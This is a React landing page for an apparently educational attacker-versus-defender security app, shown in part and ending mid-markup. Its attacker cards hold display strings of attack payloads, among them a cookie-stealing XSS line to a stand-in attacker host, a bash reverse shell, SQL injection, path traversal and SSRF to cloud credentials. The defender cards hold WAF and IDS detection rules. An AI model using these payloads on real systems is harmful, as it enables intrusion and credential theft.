import React, { useEffect, useRef, useState } from 'react';
import Lenis from 'lenis';
import { gsap } from 'gsap';
import { ScrollTrigger } from 'gsap/ScrollTrigger';
import AttackerParticles from './AttackerParticles';
import DefenderParticles from './DefenderParticles';
import { ChevronDown, LogOut, X, Terminal, Shield } from 'lucide-react';
import './StickyGridScroll.css';

gsap.registerPlugin(ScrollTrigger);

// 12 Tactical Mission Tasks for Attacker (3 columns x 4 rows)
const ATTACKER_TASKS = [
  {
    id: 'sqli',
    title: 'SQL Injection',
    badge: 'Database Exploit',
    desc: 'Extract database credentials and dump unauthorized schema tables via tainted query inputs.',
    vector: "UNION SELECT null, username, password FROM users WHERE '1'='1' --",
    details: 'Inject unescaped SQL syntax into authentication forms and search endpoints to bypass hash checks and extract administrative privileges.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <ellipse cx="12" cy="5" rx="9" ry="3" />
        <path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3" />
        <path d="M3 5v14c0 1.66 4 3 9 3 2.1 0 4.02-.24 5.5-.66" />
        <path d="m17 17 4 4" />
        <path d="m21 17-4 4" />
      </svg>
    )
  },
  {
    id: 'xss',
    title: 'Cross-Site Scripting',
    badge: 'Session Hijack',
    desc: 'Inject stored and reflected JavaScript payloads to hijack active operator sessions.',
    vector: '<script>fetch("//attacker.io/c?"+document.cookie)</script>',
    details: 'Leverage unencoded HTML output to execute client-side scripts, steal authentication tokens, and deface target interface layouts.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <polyline points="16 18 22 12 16 6" />
        <polyline points="8 6 2 12 8 18" />
        <line x1="12" y1="2" x2="12" y2="22" />
        <path d="m14 8-4 8" />
      </svg>
    )
  },
  {
    id: 'bruteforce',
    title: 'Credential Stuffing',
    badge: 'Auth Vector',
    desc: 'Automated dictionary attacks against administrative login forms to guess operator secrets.',
    vector: 'Hydra -l admin -P wordlist.txt 192.168.1.100 http-post-form',
    details: 'Deploy multi-threaded password spraying against unprotected login portals without rate-limiting or CAPTCHA defenses.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
        <path d="M7 11V7a5 5 0 0 1 9.9-1" />
        <circle cx="12" cy="16" r="1.5" />
      </svg>
    )
  },
  {
    id: 'cmd-injection',
    title: 'Command Injection',
    badge: 'Remote Code Execution',
    desc: 'Execute arbitrary host system instructions directly through vulnerable server parameters.',
    vector: '; cat /etc/passwd; id; uname -a',
    details: 'Chain system commands via shell metacharacters through diagnostic endpoints to spawn background reverse shells.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <polyline points="4 17 10 11 4 5" />
        <line x1="12" y1="19" x2="20" y2="19" />
        <circle cx="17" cy="7" r="3" />
      </svg>
    )
  },
  {
    id: 'priv-esc',
    title: 'Privilege Escalation',
    badge: 'Root Acquisition',
    desc: 'Abuse SUID binaries and kernel misconfigurations to escalate to full root privileges.',
    vector: 'find / -perm -4000 -type f 2>/dev/null; pkexec /bin/sh',
    details: 'Enumerate misconfigured sudo rules, weak permissions, and cron scripts to transition from unprivileged daemon user to superuser.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2" />
        <path d="M12 11v6" />
        <path d="m9 14 3-3 3 3" />
      </svg>
    )
  },
  {
    id: 'traversal',
    title: 'Directory Traversal',
    badge: 'File Disclosure',
    desc: 'Traverse restricted file system directories to read server configuration and private keys.',
    vector: 'GET /download.php?file=../../../../etc/shadow HTTP/1.1',
    details: 'Bypass document root containment using relative dot-dot-slash path sequences to access internal source files and database configs.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M20 20a2 2 0 0 0 2-2V8a2 2 0 0 0-2-2h-7.9a2 2 0 0 1-1.69-.9L9.6 3.9A2 2 0 0 0 7.93 3H4a2 2 0 0 0-2 2v13a2 2 0 0 0 2 2Z" />
        <path d="m14 12-4 4" />
        <path d="m10 12 4 4" />
      </svg>
    )
  },
  {
    id: 'csrf',
    title: 'CSRF Token Bypass',
    badge: 'State Manipulation',
    desc: 'Forge authenticated state-changing requests executed involuntarily by victim operators.',
    vector: '<img src="http://bank.internal/transfer?amt=50000&to=attacker">',
    details: 'Exploit missing CSRF tokens or insecure SameSite cookie policies to execute account password updates and privilege elevation.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2" />
        <circle cx="9" cy="7" r="4" />
        <line x1="19" y1="8" x2="19" y2="14" />
        <line x1="22" y1="11" x2="16" y2="11" />
      </svg>
    )
  },
  {
    id: 'recon',
    title: 'Network Port Recon',
    badge: 'Surface Discovery',
    desc: 'Map open ports, daemon fingerprints, and exposed internal service surfaces.',
    vector: 'nmap -sS -sV -p- -T4 --script vuln 10.0.0.1/24',
    details: 'Perform non-intrusive SYN stealth scans to map reachable TCP/UDP services, banner versions, and unauthenticated management consoles.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="10" />
        <path d="m4.93 4.93 4.24 4.24" />
        <path d="m14.83 9.17 4.24-4.24" />
        <path d="M12 12v6" />
        <circle cx="12" cy="12" r="2" />
      </svg>
    )
  },
  {
    id: 'c2',
    title: 'Reverse Shell Listener',
    badge: 'Command & Control',
    desc: 'Establish encrypted outbound sockets through restrictive firewalls for persistence.',
    vector: 'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1',
    details: 'Maintain persistent command-and-control access via obfuscated reverse shell sessions routed through standard egress ports.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="12" r="9" />
        <path d="M9 10h.01" />
        <path d="M15 10h.01" />
        <path d="M9.5 15.5a3.5 3.5 0 0 0 5 0" />
        <path d="M12 2v3" />
      </svg>
    )
  },
  {
    id: 'bof',
    title: 'Buffer Overflow',
    badge: 'Memory Corruption',
    desc: 'Smash execution stack pointers to redirect control flow into custom shellcode buffers.',
    vector: 'python3 -c "print(\'A\'*112 + \'\\xef\\xbe\\xad\\xde\')" | ./vulnerable_bin',
    details: 'Inject structured overflow strings to overwrite register EIP/RIP with shellcode return addresses.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect x="2" y="6" width="20" height="12" rx="2" />
        <path d="M6 12h4" />
        <path d="M14 12h4" />
        <path d="m10 9 4 6" />
      </svg>
    )
  },
  {
    id: 'ssrf',
    title: 'Server-Side Request Forgery',
    badge: 'Cloud Pivot',
    desc: 'Force backend hosts to query cloud metadata services (169.254.169.254) and internal APIs.',
    vector: 'http://victim.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    details: 'Pivot through vulnerable webhook endpoints to exfiltrate temporary AWS IAM tokens and internal cluster service accounts.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M18 10h-1.26A8 8 0 1 0 9 20h9a5 5 0 0 0 0-10z" />
        <path d="m12 12-2 2 2 2" />
      </svg>
    )
  },
  {
    id: 'kerberoast',
    title: 'Active Directory Kerberoasting',
    badge: 'Domain Compromise',
    desc: 'Request service tickets (TGS) for SPNs and crack encrypted service account hashes offline.',
    vector: 'GetUserSPNs.py -request -dc-ip 10.0.0.1 domain.local/user:password -outputfile hashes.txt',
    details: 'Target service accounts with weak passwords registered under Service Principal Names to achieve full domain administrator takeover.',
    svg: (
      <svg className="w-7 h-7 text-red-500" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z" />
        <line x1="4" y1="22" x2="4" y2="15" />
      </svg>
    )
  }
];

// 12 Tactical Defense Tasks for Defender (3 columns x 4 rows)
const DEFENDER_TASKS = [
  {
    id: 'ddos',
    title: 'DDoS Mitigation',
    badge: 'Traffic Scrubbing',
    desc: 'Filter volumetric flood vectors and SYN floods at edge proxies using rate-limiting filters.',
    vector: 'iptables -A INPUT -p tcp --syn -m limit --limit 50/s --limit-burst 100 -j ACCEPT',
    details: 'Deploy BGP Anycast routing and automated packet scrubbing centers to neutralize high-bandwidth UDP amplification attacks.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10" />
        <path d="m9 12 2 2 4-4" />
      </svg>
    )
  },
  {
    id: 'waf',
    title: 'WAF Rule Formulation',
    badge: 'Layer 7 Filter',
    desc: 'Inspect inbound HTTP payloads in real-time, blocking malicious regular expressions.',
    vector: 'SecRule REQUEST_COOKIES|!REQUEST_COOKIES:/__utm/ "(?:^|[^\w])(?:union\s+select)" "id:1001,phase:2,deny,status:403"',
    details: 'Configure ModSecurity Core Rule Set filters to inspect URI arguments and headers, stopping OWASP Top 10 exploits.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect width="18" height="18" x="3" y="3" rx="2" />
        <path d="M3 9h18" />
        <path d="M9 21V9" />
      </svg>
    )
  },
  {
    id: 'edr',
    title: 'Endpoint Telemetry',
    badge: 'EDR Auditing',
    desc: 'Stream kernel system call events and detect unauthorized process spawns across hosts.',
    vector: 'auditctl -a always,exit -F arch=b64 -S execve -k process_audit',
    details: 'Monitor process creation trees, unexpected DLL injection, and memory allocation hooks to instantly identify living-off-the-land techniques.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect width="20" height="14" x="2" y="3" rx="2" />
        <line x1="8" y1="21" x2="16" y2="21" />
        <line x1="12" y1="17" x2="12" y2="21" />
        <path d="m7 10 2 2 4-4" />
      </svg>
    )
  },
  {
    id: 'siem',
    title: 'SIEM Correlation',
    badge: 'Threat Intelligence',
    desc: 'Aggregate disparate audit streams into centralized query clusters for anomaly detection.',
    vector: 'index=security_logs sourcetype=auth_fail | stats count by user, src_ip | where count > 10',
    details: 'Synthesize authentication, firewall, and DNS queries into dynamic risk scores to alert Security Operations Centers of active intrusions.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M3 3v18h18" />
        <path d="m19 9-5 5-4-4-3 3" />
      </svg>
    )
  },
  {
    id: 'iam',
    title: 'Zero Trust Access',
    badge: 'Identity Perimeter',
    desc: 'Enforce hardware-bound FIDO2 authentication and contextual access control verification.',
    vector: 'policy.enforce({ identity: user.fido2_verified, posture: host.compliant, ip: allowed_range })',
    details: 'Eliminate implicit network trust by validating certificate-based authentication and device posture on every microservice transaction.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="12" cy="7" r="4" />
        <path d="M6 21v-2a4 4 0 0 1 4-4h4a4 4 0 0 1 4 4v2" />
        <path d="m16 11 2 2 4-4" />
      </svg>
    )
  },
  {
    id: 'hsm',
    title: 'Cryptographic Key Vault',
    badge: 'HSM Protection',
    desc: 'Enforce AES-256 GCM envelope encryption with hardware security module root of trust.',
    vector: 'openssl enc -aes-256-gcm -pbkdf2 -iter 100000 -in secret.dat -out secret.enc',
    details: 'Safeguard database secrets, SSL private keys, and API tokens inside tamper-resistant hardware security modules with automated 90-day rotation.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M21 2l-2 2m-1-1l-3 3m5 8h-4l-2 4H6a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h8l2 4h5a2 2 0 0 1 2 2v6a2 2 0 0 1-2 2z" />
      </svg>
    )
  },
  {
    id: 'honeypot',
    title: 'Honeypot Decoy Grid',
    badge: 'Deception Tech',
    desc: 'Deploy low-interaction decoy services to bait, log, and profile adversary techniques.',
    vector: 'cowrie start --listen 0.0.0.0:2222 --banner "OpenSSH_8.2p1 Ubuntu-4ubuntu0.5"',
    details: 'Lure automated scanners and opportunistic threat actors into isolated deceptive sandbox instances for high-fidelity attribution.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M10 2v2" />
        <path d="M14 2v2" />
        <path d="M16 8a4 4 0 0 1-8 0V6h8z" />
        <path d="M6 10v10a2 2 0 0 0 2 2h8a2 2 0 0 0 2-2V10" />
      </svg>
    )
  },
  {
    id: 'nids',
    title: 'Packet Deep Inspection',
    badge: 'Network IDS',
    desc: 'Run multi-gigabit traffic inspection against signature rulesets (Suricata / Snort).',
    vector: 'alert tcp $EXTERNAL_NET any -> $HOME_NET 80 (msg:"ET WEB_SPECIFIC_APPS SQLi"; content:"UNION SELECT"; sid:2000001;)',
    details: 'Decouple network flows into stateful protocol reassembly engines to identify C2 beacons, DNS tunneling, and exploit shellcode in real-time.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <rect x="2" y="4" width="20" height="8" rx="2" />
        <rect x="2" y="14" width="20" height="6" rx="2" />
        <line x1="6" y1="8" x2="6.01" y2="8" />
        <line x1="10" y1="8" x2="10.01" y2="8" />
      </svg>
    )
  },
  {
    id: 'soar',
    title: 'SOAR Auto-Quarantine',
    badge: 'Response Automation',
    desc: 'Automatically isolate compromised host nodes and revoke session tokens in milliseconds.',
    vector: 'soar.trigger("quarantine_host", { ip: alert.src_ip, revoke_token: alert.user_session })',
    details: 'Execute programmatic containment scripts upon high-severity alerts to sever outbound connections and dump memory for forensic analysis.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2" />
      </svg>
    )
  },
  {
    id: 'aslr',
    title: 'Memory Protection',
    badge: 'Binary Hardening',
    desc: 'Enforce Address Space Layout Randomization (ASLR) and Data Execution Prevention (DEP).',
    vector: 'echo 2 > /proc/sys/kernel/randomize_va_space',
    details: 'Randomize memory page locations of the program stack, heap, and libraries to prevent reliable return-oriented programming (ROP) exploits.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10" />
        <line x1="12" y1="8" x2="12" y2="12" />
        <line x1="12" y1="16" x2="12.01" y2="16" />
      </svg>
    )
  },
  {
    id: 'microseg',
    title: 'Network Microsegmentation',
    badge: 'Perimeter Defense',
    desc: 'Isolate sensitive database tiers from web tiers using granular Calico and eBPF policies.',
    vector: 'apiVersion: projectcalico.org/v3 kind: NetworkPolicy spec: selector: app == "db" ingress: - action: Allow source: selector: app == "api"',
    details: 'Confine workloads to least-privilege egress and ingress network rules, preventing lateral movement during active breaches.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="6" cy="6" r="3" />
        <circle cx="18" cy="18" r="3" />
        <line x1="8.59" y1="8.59" x2="15.42" y2="15.42" />
        <circle cx="18" cy="6" r="3" />
        <circle cx="6" cy="18" r="3" />
      </svg>
    )
  },
  {
    id: 'forensics',
    title: 'Forensic Memory Triage',
    badge: 'Incident Analysis',
    desc: 'Acquire raw volatility dumps to extract active injected DLLs and unencrypted C2 keys.',
    vector: 'vol.py -f memory.raw windows.malfind.Malfind',
    details: 'Perform post-incident triage on memory dumps to reconstruct attacker persistence mechanisms, timestamps, and exfiltrated payloads.',
    svg: (
      <svg className="w-7 h-7 text-[#2ab7ff]" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
        <circle cx="11" cy="11" r="8" />
        <line x1="21" y1="21" x2="16.65" y2="16.65" />
        <line x1="11" y1="8" x2="11" y2="14" />
        <line x1="8" y1="11" x2="14" y2="11" />
      </svg>
    )
  }
];

export default function RoleLandingPage({ role = 'attacker', email = '', onSignOut }) {
  const isAttacker = role === 'attacker';
  const tasks = isAttacker ? ATTACKER_TASKS : DEFENDER_TASKS;

  const [selectedTask, setSelectedTask] = useState(null);

  const introRef = useRef(null);
  const mainBlockRef = useRef(null);
  const wrapperRef = useRef(null);
  const contentRef = useRef(null);
  const titleRef = useRef(null);
  const descRef = useRef(null);
  const btnRef = useRef(null);
  const gridRef = useRef(null);

  useEffect(() => {
    // 1. Initialize Lenis Smooth Scrolling (exact Codrops parameters)
    const lenis = new Lenis({
      lerp: 0.08,
      wheelMultiplier: 1.4,
      smoothWheel: true
    });

    lenis.on('scroll', ScrollTrigger.update);

    const tickerCb = (time) => {
      lenis.raf(time * 1000);
    };
    gsap.ticker.add(tickerCb);
    gsap.ticker.lagSmoothing(0);

    // 2. Query DOM elements
    const blockEl = mainBlockRef.current;
    const wrapperEl = wrapperRef.current;
    const contentEl = contentRef.current;
    const titleEl = titleRef.current;
    const descEl = descRef.current;
    const buttonEl = btnRef.current;
    const gridEl = gridRef.current;

    let items = [];
    if (gridEl) {
      items = Array.from(gridEl.querySelectorAll('.gallery__item'));
    }

    // 3. Distribute items into 3 columns (4 items each)
    const numColumns = 3;
    const columns = Array.from({ length: numColumns }, () => []);
    items.forEach((item, index) => {
      columns[index % numColumns].push(item);
    });

    // 4. Initial Content State (exact Codrops logic)
    let titleOffsetY = 0;
    if (descEl && buttonEl) {
      gsap.set([descEl, buttonEl], { opacity: 0, pointerEvents: 'none' });
    }
    if (contentEl && titleEl) {
      const dy = (contentEl.offsetHeight - titleEl.offsetHeight) / 2;
      titleOffsetY = (dy / contentEl.offsetHeight) * 100;
      gsap.set(titleEl, { yPercent: titleOffsetY });
    }

    // 5. Parallax on Wrapper (exact Codrops implementation)
    const parallaxTrigger = gsap.from(wrapperEl, {
      yPercent: -100,
      ease: 'none',
      scrollTrigger: {
        trigger: blockEl,
        start: 'top bottom',
        end: 'top top',
        scrub: true
      }
    });

    // 6. Animate Title Opacity
    const titleTrigger = gsap.from(titleEl, {
      opacity: 0,
      duration: 0.7,
      ease: 'power1.out',
      scrollTrigger: {
        trigger: blockEl,
        start: 'top 57%',
        toggleActions: 'play none none reset'
      }
    });

    // 7. Grid Reveal Timeline (exact Codrops stagger & alternation)
    const wh = window.innerHeight;
    const r = wh - (wh - (gridEl?.offsetHeight || 650)) / 2;
    const revealTimeline = gsap.timeline();
    columns.forEach((column, colIndex) => {
      const fromTop = colIndex % 2 === 0;
      revealTimeline.from(
        column,
        {
          y: r * (fromTop ? -1 : 1),
          stagger: {
            each: 0.06,
            from: fromTop ? 'end' : 'start'
          },
          ease: 'power1.inOut'
        },
        'grid-reveal'
      );
    });

    // 8. Grid Zoom Timeline (exact Codrops scale 2.05 & split)
    const zoomTimeline = gsap.timeline({ defaults: { duration: 1, ease: 'power3.inOut' } });
    if (gridEl) {
      zoomTimeline.to(gridEl, { scale: 2.05 });
    }
    if (columns[0].length) zoomTimeline.to(columns[0], { xPercent: -40 }, '<');
    if (columns[2].length) zoomTimeline.to(columns[2], { xPercent: 40 }, '<');
    if (columns[1].length) {
      zoomTimeline.to(
        columns[1],
        {
          yPercent: (index) => (index < Math.floor(columns[1].length / 2) ? -1 : 1) * 40,
          duration: 0.5,
          ease: 'power1.inOut'
        },
        '-=0.5'
      );
    }

    // 9. Content Toggle Callback (exact Codrops easing & timing)
    const toggleContent = (isVisible) => {
      if (!titleEl || !descEl || !buttonEl) return;
      gsap.timeline({ defaults: { overwrite: true } })
        .to(titleEl, {
          yPercent: isVisible ? 0 : titleOffsetY,
          duration: 0.7,
          ease: 'power2.inOut'
        })
        .to(
          [descEl, buttonEl],
          {
            opacity: isVisible ? 1 : 0,
            duration: 0.4,
            ease: `power1.${isVisible ? 'inOut' : 'out'}`,
            pointerEvents: isVisible ? 'all' : 'none'
          },
          isVisible ? '-=90%' : '<'
        );
    };

    // 10. Master Grid Scroll Timeline (scrubbed from top 25% to bottom bottom)
    const masterTimeline = gsap.timeline({
      scrollTrigger: {
        trigger: blockEl,
        start: 'top 25%',
        end: 'bottom bottom',
        scrub: true
      }
    });

    masterTimeline
      .add(revealTimeline)
      .add(zoomTimeline, '-=0.6')
      .add(() => {
        toggleContent(masterTimeline.scrollTrigger?.direction === 1);
      }, '-=0.32');

    return () => {
      lenis.destroy();
      gsap.ticker.remove(tickerCb);
      parallaxTrigger.kill();
      titleTrigger.kill();
      masterTimeline.kill();
      ScrollTrigger.getAll().forEach((t) => t.kill());
    };
  }, []);

  return (
    <div className="scroll-page selection:bg-white/20">
      {/* Sleek CyberForge HUD Bar */}
      <header className="fixed top-0 left-0 right-0 z-50 flex items-center justify-between px-6 py-4 bg-black/50 backdrop-blur-md border-b border-white/10 pointer-events-auto">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 rounded-lg bg-[#141724] border border-[#23283b] flex items-center justify-center">
            {isAttacker ? (
              <Terminal className="w-4 h-4 text-red-500" />
            ) : (
              <Shield className="w-4 h-4 text-[#2ab7ff]" />
            )}
          </div>
          <div>
            <span className="text-xs font-mono font-bold tracking-widest text-white uppercase block">
              CyberForge OS
            </span>
            <span className={`text-[10px] font-mono tracking-wider ${isAttacker ? 'text-red-400' : 'text-[#2ab7ff]'}`}>
              {isAttacker ? 'ATTACKER PROTOCOL' : 'DEFENDER SHIELD'}
            </span>
          </div>
        </div>

        <div className="flex items-center gap-4">
          <div className="hidden sm:flex items-center gap-2 px-3 py-1 rounded-full bg-[#141724] border border-[#23283b] text-xs font-mono text-zinc-300">
            <span className={`w-2 h-2 rounded-full ${isAttacker ? 'bg-red-500 shadow-[0_0_8px_#ff2a3d]' : 'bg-[#2ab7ff] shadow-[0_0_8px_#2ab7ff]'}`} />
            <span>{email || (isAttacker ? 'attacker@cyberforge.local' : 'defender@cyberforge.local')}</span>
          </div>

          <button
            onClick={onSignOut}
            className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#141724] hover:bg-white/10 border border-[#23283b] text-xs font-mono text-zinc-300 hover:text-white transition-colors"
          >
            <LogOut className="w-3.5 h-3.5" />
            <span>Sign Out</span>
          </button>
        </div>
      </header>

      {/* ---------------- BLOCK INTRO: Fixed 3D Particle Canvas Viewport ---------------- */}
      <section ref={introRef} className="block--intro">
        {/* WebGL Particle Simulation (Hooded Mask / Shield Hood) */}
        {isAttacker ? (
          <AttackerParticles />
        ) : (
          <DefenderParticles />
        )}

        {/* Hero Scroll Cue */}
        <div className="absolute bottom-8 left-1/2 -translate-x-1/2 z-20 flex flex-col items-center gap-2 pointer-events-none opacity-85">
          <span className={`text-[11px] font-mono tracking-widest uppercase ${isAttacker ? 'text-red-300/80' : 'text-sky-300/80'}`}>
            Scroll to Explode & Reveal Mission Grid
          </span>
          <ChevronDown className={`w-5 h-5 animate-bounce ${isAttacker ? 'text-red-400' : 'text-[#2ab7ff]'}`} />
        </div>
      </section>

      {/* ---------------- BLOCK MAIN: 425vh Sticky Parallax & Zoom Grid ---------------- */}
      <section ref={mainBlockRef} className="block block--main">
        <div ref={wrapperRef} className="block__wrapper">
          {/* Centered Content Overlay (revealed upon scroll zoom) */}
          <div ref={contentRef} className="content">
            <h1
              ref={titleRef}
              className={`content__title bg-clip-text text-transparent bg-gradient-to-b ${
                isAttacker
                  ? 'from-white via-zinc-200 to-red-500'
                  : 'from-white via-zinc-200 to-[#2ab7ff]'
              }`}
            >
              {isAttacker ? 'Offensive Protocols' : 'Perimeter Defense'}
            </h1>

            <p ref={descRef} className="content__description">
              {isAttacker
                ? 'EXPLOIT HIGH-VALUE SYSTEM VECTORS, EXTRACT PRIVILEGED CREDENTIALS, AND COMPROMISE TARGET ARCHITECTURES.'
                : 'MONITOR REAL-TIME TELEMETRY, FORMULATE WAF INSPECT FILTERS, AND FORTIFY HOST SECURITY TOPOLOGY.'}
            </p>

            <button
              ref={btnRef}
              onClick={() => alert(`Launching ${isAttacker ? 'Attacker Command Center' : 'Defender Console'}...`)}
              className={`content__button inline-flex items-center gap-2 px-8 py-3.5 rounded-xl border shadow-xl ${
                isAttacker
                  ? 'bg-red-950/60 hover:bg-red-900/80 border-red-500/50 text-red-200 shadow-red-500/25'
                  : 'bg-sky-950/60 hover:bg-sky-900/80 border-[#2ab7ff]/50 text-[#dbf5ff] shadow-[#2ab7ff]/25'
              }`}
            >
              <span>{isAttacker ? 'Engage War Room →' : 'Activate SOC Console →'}</span>
            </button>
          </div>

          {/* 3-Column Tactical Task Gallery Grid (12 Items) */}
          <div className="gallery">
            <div ref={gridRef} className="gallery__grid">
              {tasks.map((task) => (
                <div key={task.id} className="gallery__item">
                  <div
                    onClick={() => setSelectedTask(task)}
                    className={`cyber-card bg-[#0b0e17]/95 border backdrop-blur-md ${
                      isAttacker
                        ? 'border-[#26141a] hover:border-red-500/80 hover:shadow-[0_0_24px_rgba(255,42,61,0.3)]'
                        : 'border-[#152336] hover:border-[#2ab7ff]/80 hover:shadow-[0_0_24px_rgba(42,183,255,0.3)]'
                    }`}
                  >
                    <div>
                      {/* Card Header with SVG & Badge */}
                      <div className="flex items-center justify-between mb-2">
                        <div
                          className={`p-2 rounded-xl ${
                            isAttacker
                              ? 'bg-red-950/60 border border-red-500/30'
                              : 'bg-sky-950/60 border border-[#2ab7ff]/30'
                          }`}
                        >
                          {task.svg}
                        </div>
                        <span
                          className={`text-[9px] font-mono px-2 py-0.5 rounded-full border ${
                            isAttacker
                              ? 'bg-red-950/50 text-red-300 border-red-500/30'
                              : 'bg-sky-950/50 text-sky-300 border-[#2ab7ff]/30'
                          }`}
                        >
                          {task.badge}
                        </span>
                      </div>

                      {/* Card Title & Desc */}
                      <h3 className="text-xs sm:text-sm font-bold text-white mb-1 tracking-tight">
                        {task.title}
                      </h3>
                      <p className="text-[10px] text-zinc-400 line-clamp-2 leading-relaxed">
                        {task.desc}
                      </p>
                    </div>

                    {/* "More ->" Link */}
                    <div className="pt-2 border-t border-white/5 flex items-center justify-between mt-auto">
                      <button
                        type="button"
                        onClick={(e) => {
                          e.stopPropagation();
                          setSelectedTask(task);
                        }}
                        className={`inline-flex items-center gap-1.5 text-xs font-mono font-bold group-hover:underline ${
                          isAttacker ? 'text-red-400 hover:text-red-300' : 'text-[#2ab7ff] hover:text-[#7ad6ff]'
                        }`}
                      >
                        <span>More</span>
                        <span className="transition-transform group-hover:translate-x-1">→</span>
                      </button>
                      <span className="text-[9px] font-mono text-zinc-600">MISSION</span>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      </section>

      {/* ---------------- TACTICAL TASK MODAL ("More ->") ---------------- */}
      {selectedTask && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/80 backdrop-blur-md">
          <div
            className={`w-full max-w-lg bg-[#0e111a] border rounded-2xl p-6 sm:p-8 shadow-2xl relative overflow-hidden ${
              isAttacker ? 'border-red-500/40' : 'border-[#2ab7ff]/40'
            }`}
          >
            {/* Modal Ambient Top Glow */}
            <div
              className={`absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-transparent ${
                isAttacker ? 'via-red-500' : 'via-[#2ab7ff]'
              } to-transparent`}
            />

            {/* Modal Header */}
            <div className="flex items-start justify-between mb-5">
              <div className="flex items-center gap-3">
                <div
                  className={`p-3 rounded-xl ${
                    isAttacker
                      ? 'bg-red-950/50 border border-red-500/40 text-red-400'
                      : 'bg-sky-950/50 border border-[#2ab7ff]/40 text-[#2ab7ff]'
                  }`}
                >
                  {selectedTask.svg}
                </div>
                <div>
